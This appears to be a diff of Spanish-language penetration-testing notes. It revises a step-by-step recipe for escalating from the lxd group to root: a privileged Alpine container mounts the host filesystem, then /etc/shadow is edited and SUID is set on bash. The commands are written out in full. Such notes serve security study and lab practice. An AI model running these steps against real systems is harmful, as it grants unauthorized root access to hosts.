@@ -2831,91 +2831,88 @@ uid=1000(elliot) gid=1000(elliot) groups=1000(container-user),116(lxd)
 
 ###### Explotación
 
-A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como /etc/shadow
+A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como `/etc/shadow`.
 
 1. **Descargar y transferir la imagen Alpine**:
 
-    Descarga la imagen mínima de Alpine Linux desde Docker. Esta imagen es ideal debido a su pequeño tamaño (aprox. 5 MB) y su completo índice de paquetes.
+    - Descarga la imagen mínima de Alpine Linux desde `https://github.com/saghul/lxd-alpine-builder.git`
 
-    Transferimos la imagen a la máquina víctima.
+        ```bash
+        git clone https://github.com/saghul/lxd-alpine-builder.git
+        ```
+    - Transferir el archivo `alpine-v3.3-x86_64-20160114_2308.tar.gz`.
 
 2. **Inicializar LXD**:
 
-    Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).
+    - Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).
 
-3. **Descomprimir la imagen Alpine**:
+3. **Importar la imagen local**:
 
-    Descomprimimos el archivo `alpine.zip` para obtener `alpine.tar.gz`.
+    - Usamos el siguiente comando para importar la imagen:
 
-4. **Importar la imagen local**:
+        ```bash
+        lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine
+        ```
 
-    Usamos el siguiente comando para importar la imagen:
-
-    ```bash
-    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
-    ```
-
-    Verificmos la importación con:
+    - Verificmos la importación con:
     
-    ```bash
-    lxc image list
-    ```
-5. **Crear un contenedor privilegiado**:
+        ```bash
+        lxc image list
+        ```
+4. **Crear un contenedor privilegiado**:
 
-    Iniciamos un contenedor con privilegios elevados usando:
+    - Iniciamos un contenedor con privilegios elevados usando:
 
-    ```bash
-    lxc init alpine privesc -c security.privileged=true
-    ```
-    
-    - `alpine`: Nombre de la imagen.
-    - `privesc`: Nombre del contenedor.
-    - `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.
+        ```bash
+        lxc init alpine privesc -c security.privileged=true
+        ```
+        
+        - `alpine`: Nombre de la imagen.
+        - `privesc`: Nombre del contenedor.
+        - `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.
 
-6. **Montar el sistema de archivos del host**:
+5. **Montar el sistema de archivos del host**:
     - Montamos todo el sistema de archivos del host (`/`) en el contenedor:
 
-    ```bash
-    lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
-    ```
+        ```bash
+        lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
+        ```
 
-    - `source=/`: Ruta del sistema de archivos del host.
-    - `path=/mnt/root`: Ruta de montaje en el contenedor.
-    - `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.
+        - `source=/`: Ruta del sistema de archivos del host.
+        - `path=/mnt/root`: Ruta de montaje en el contenedor.
+        - `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.
 
-7. **Iniciar el contenedor**:
+6. **Iniciar el contenedor**:
     - Iniciamos el contenedor con:
 
-    ```bash
-    lxc start privesc
-    ```
+        ```bash
+        lxc start privesc
+        ```
 
     - Verificamos el estado del contenedor con:
 
-    ```bash
-    lxc list
-    ```
-8. **Ejecutar comandos dentro del contenedor**:
+        ```bash
+        lxc list
+        ```
+7. **Ejecutar comandos dentro del contenedor**:
     - Accedemos a una shell dentro del contenedor:
 
-    ```bash
-    lxc exec privesc /bin/sh
-    ```
-9. **Modificar el sistema de archivos del host**:
+        ```bash
+        lxc exec privesc /bin/sh
+        ```
+8. **Modificar el sistema de archivos del host**:
 
     - Dentro del contenedor, navegamos a `/mnt/root` para acceder al sistema de archivos del host.
 
-    - Editamos archivos críticos como `/mnt/root/etc/shadow` para eliminar o cambiar la contraseña de `root`.
+    - Editamos archivos críticos como `/mnt/root/etc/shadow` para cambiar la contraseña de `root`.
 
     - Esto permite iniciar sesión como `root` en el host.
-    - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`
+    - También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`.
 
 ##### Docker
 ##### Python Library Hijacking
 ##### LD_PRELOAD Shared Library
 ##### Shared Object
-
-
 
 ##  10. <a name='active-directory'></a>Active Directory
 
